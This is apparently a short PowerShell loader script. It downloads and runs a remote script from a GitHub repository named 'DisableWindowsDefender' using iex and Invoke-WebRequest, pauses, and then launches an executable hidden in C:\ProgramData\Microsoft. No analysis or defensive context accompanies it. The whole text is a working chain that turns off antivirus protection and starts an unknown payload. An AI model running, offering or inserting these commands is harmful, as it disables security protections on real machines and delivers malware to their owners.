iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/main/aa.ps1").Content
Start-Sleep -Seconds 3
Start-Process -FilePath "C:\ProgramData\Microsoft\zart.exe"
